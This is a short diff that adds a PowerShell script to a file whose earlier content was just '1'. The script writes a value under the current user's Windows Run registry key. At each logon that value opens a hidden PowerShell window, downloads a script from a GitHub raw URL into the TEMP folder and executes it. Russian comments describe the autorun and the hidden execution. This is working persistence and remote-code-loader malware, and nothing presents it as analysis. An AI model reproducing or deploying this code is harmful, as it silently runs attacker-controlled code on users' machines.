@@ -1,1 +1,11 @@
-1
+$remoteScriptUrl = "https://github.com/dfgsgsdfgfd/1/raw/refs/heads/main/2"
+
+# Реестр для автозапуска только для текущего пользователя
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regValue = "RemoteScript"
+
+# Команда для скрытого выполнения
+$command = "powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '$remoteScriptUrl' -OutFile '$env:TEMP\script.ps1'; & '$env:TEMP\script.ps1'"
+
+# Добавление записи в реестр
+Set-ItemProperty -Path $regKey -Name $regValue -Value $command
